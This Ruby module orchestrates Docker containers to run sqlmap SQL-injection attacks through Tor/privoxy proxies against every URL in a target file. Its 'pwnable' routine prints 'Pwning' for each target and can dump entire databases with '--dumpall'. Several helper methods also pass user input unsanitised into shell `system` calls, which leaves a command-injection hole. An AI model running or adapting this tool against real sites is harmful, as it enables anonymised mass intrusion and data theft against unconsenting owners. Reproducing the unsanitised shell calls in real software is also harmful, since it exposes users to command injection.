require 'pp'

# Functions that use Docker Containers!
module DockerModule

    @@container_file="#{ENV['HOME']}/.instances"
    def check_docker_containers
        # Write +1 in container_number file!
        if File.exist?(@@container_file)
            containers = File.read(@@container_file).to_i
            File.open(@@container_file, 'w') { |file| file.print containers + 1 }
            containers += 1

        else
            # Create the file number for the first time!
            File.open(@@container_file, 'w') { |file| file.print 2 }
            containers = File.read(@@container_file).to_i

        end

    end

    def log_containers arg
        if arg.empty?
            "No container id provided!"
        else
            system "docker logs --details -f #{arg}"
            exit 0
        end
    end

    def list_containers
        system "docker ps -a"

    end

    def stop_containers arg
        if !File.exist?(@@container_file)
            puts "There's no active containers at the moment [!!]"
            exit 0
        end

        if arg == "all"
            s_containers =`docker ps -aq`
            s_containers = s_containers.split("\n")

            s_containers.each do |container|
                system "docker stop #{container} | xargs docker rm 2>/dev/null"

            end
            system "rm #{@@container_file}"

        else
            system "docker stop #{arg} | xargs docker rm >> /dev/null"
            puts "#{arg} Removed!!!"

        end
        exit 0

    end

    def stats_containers
        system('docker stats --format "table {{.Name}} \t{{.CPUPerc}}\t{{.MemUsage}}\t{{.NetIO}}\t {{.BlockIO }} "')
    end

    def injector_container_attack
        # IO.popen("docker run -d -it -v #{@volume} --name injector#{@containers} alexoscorelabs/sqlmap -u '#{@target}' --proxy http://172.17.0.#{@containers}:8118 --random-agent --tamper #{@tamper} --time-sec #{@timesec} --batch #{@level} #{@risk}" + " #{@more_options_to_attack} " + ( (@dump_all !=nil) ? "--dumpall" : " ") + ">> /dev/null")
        IO.popen("docker run -d -it -v #{@volume} --name injector#{@containers} alexoscorelabs/sqlmap -u '#{@target}' --proxy http://172.17.0.#{@containers}:8118 --random-agent --time-sec #{@timesec} --batch #{@level} #{@risk}" + " #{@more_options_to_attack} " + ( (@dump_all !=nil) ? "--dumpall" : " ") + ">> /dev/null")

    end

    def pwnable
        # Check Docker Container number to start
        @containers = check_docker_containers

        # Start Proxy(TOR) container
        system "docker run -d --name privoxy#{@containers} alexoscorelabs/privoxy >> /dev/null"
        sleep(10)
        puts "Pwning: '#{@target}' Proxy: http://172.17.0.#{@containers}:8118"
        injector_container_attack

    end

    def run_docker_containers
        if !@url_file.empty?
            if File.exist?(@url_file)
                f = File.open(@url_file)

                f.each do |x|
                    @target = x
                    # Run docker containers for each target
                    pwnable
                end
                exit

            else
                STDERR.puts "[-] The file #{@url_file} was not found [!!]"
                STDERR.puts '[-] Please insert a valid file [!!]'
                exit

            end

        end

        pwnable
    end

end
